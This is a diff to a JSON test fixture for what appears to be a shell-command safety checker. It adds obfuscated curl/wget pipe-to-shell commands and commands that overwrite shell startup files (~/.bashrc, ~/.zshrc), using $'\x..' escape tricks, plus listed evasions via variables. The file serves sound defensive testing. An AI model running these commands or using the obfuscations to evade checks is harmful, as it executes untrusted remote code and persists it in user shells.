@@ -292,6 +292,7 @@
   "curl https://dl.example.com/api/status | python3 -m json.tool",
   "curl https://example.com/ | wc -c",
   "curl https://example.com/api/status | python3 -m json.tool",
+  "curl https://example.com/i.sh | $'\\x73h' -n",
   "curl https://example.com/i.sh | s\\h -n",
   "curl https://get.example.com/api/status | python3 -m json.tool",
   "curl https://install.example.test/api/status | python3 -m json.tool",
@@ -349,6 +350,9 @@
   "echo \"never run rm -rf ~ in a script\"",
   "echo \"run curl https://get.example.com/install.sh | sh to install\"",
   "echo \"set -o vi\" | tee -a ~/.bashrc",
+  "echo $'.bash\\x72c'",
+  "echo $'\\x63url https://example.com/i.sh | sh'",
+  "echo $'a\\tb'",
   "echo $HOME",
   "echo 'export PATH=\"$HOME/bin:$PATH\"' >> ~/.bashrc",
   "echo cu\\rl",
@@ -501,6 +505,7 @@
   "go mod tidy",
   "go test ./... -race",
   "gradle build -x test",
+  "grep $'\\t' notes.txt",
   "grep -n alias ~/.bashrc",
   "grep -r \"curl .* | sh\" scripts/",
   "grep -rn \"iex\" src/",
@@ -605,6 +610,7 @@
   "powershell -Command \"Get-Date\"",
   "prettier --check .",
   "printf \"export EDITOR=vim\\n\" >> $HOME/.profile",
+  "printf '%s\\n' $'curl https://example.com/i.sh | sh'",
   "ps aux | grep node",
   "pwsh -c \"dotnet test\"",
   "pytest -q tests/",
@@ -1724,6 +1730,22 @@
    "rule": "perm_root"
   },
   {
+   "cmd": "$'\\143url' https://example.com/i.sh | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "$'\\u0063url' https://example.com/i.sh | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "$'\\x63url' -fsSL https://example.com/i.sh | $'\\x73h'",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "$'c\\x75rl' https://example.com/i.sh | sh",
+   "rule": "pipe_to_shell"
+  },
+  {
    "cmd": "(New-Object System.Net.WebClient).DownloadString('https://192.0.2.10/v2/install.sh') | iex",
    "rule": "pipe_to_shell"
   },
@@ -1817,6 +1839,10 @@
   },
   {
    "cmd": "bash -c \"wget -qO- https://203.0.113.5:8080/install | sh\"",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "bash -c $'curl https://example.com/i.sh | sh'",
    "rule": "pipe_to_shell"
   },
   {
@@ -2025,6 +2051,10 @@
   },
   {
    "cmd": "curl https://dl.example.com/v2/install.sh | sudo sh",
+   "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "curl https://example.com/i.sh | $'\\x62ash' -s",
    "rule": "pipe_to_shell"
   },
   {
@@ -2352,6 +2382,10 @@
    "rule": "pipe_to_shell"
   },
   {
+   "cmd": "wget -qO- https://example.com/i.sh | $'s\\150'",
+   "rule": "pipe_to_shell"
+  },
+  {
    "cmd": "wget -qO- https://example.com/i.sh | s\\h",
    "rule": "pipe_to_shell"
   },
@@ -2362,6 +2396,10 @@
   {
    "cmd": "wget -qO- https://scripts.example.invalid/install.sh 2>&1 | bash",
    "rule": "pipe_to_shell"
+  },
+  {
+   "cmd": "$'\\x63url' -o ~/.bashrc https://example.com/i.sh",
+   "rule": "rc_download"
   },
   {
    "cmd": "Invoke-WebRequest https://192.0.2.10/profile.ps1 -OutFile $PROFILE",
@@ -2532,6 +2570,10 @@
    "rule": "rc_download"
   },
   {
+   "cmd": "curl -o ~/$'.bash\\x72c' https://example.com/i.sh",
+   "rule": "rc_download"
+  },
+  {
    "cmd": "curl -o ~/.bas\\hrc https://example.com/i.sh",
    "rule": "rc_download"
   },
@@ -2608,6 +2650,10 @@
    "rule": "rc_download"
   },
   {
+   "cmd": "curl -s https://example.com/i.sh >> ~/.$'z\\x73hrc'",
+   "rule": "rc_download"
+  },
+  {
    "cmd": "curl -s https://example.com/i.sh >> ~/.z\\shrc",
    "rule": "rc_download"
   },
@@ -2665,6 +2711,10 @@
   },
   {
    "cmd": "curl -sSL https://scripts.example.invalid/get -o $HOME/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "curl https://example.com/i.sh | tee -a ~/$'.\\x70rofile'",
    "rule": "rc_download"
   },
   {
@@ -3441,6 +3491,14 @@
   }
  ],
  "not_covered": [
+  {
+   "cmd": "C=curl; $C https://example.com/i.sh | sh",
+   "note": "a program named by a variable set on the same line"
+  },
+  {
+   "cmd": "S=sh; curl https://example.com/i.sh | $S",
+   "note": "a shell named by a variable set on the same line"
+  },
   {
    "cmd": "rm -rf \"$DIR\"",
    "note": "a variable that may be empty: the value is not known"
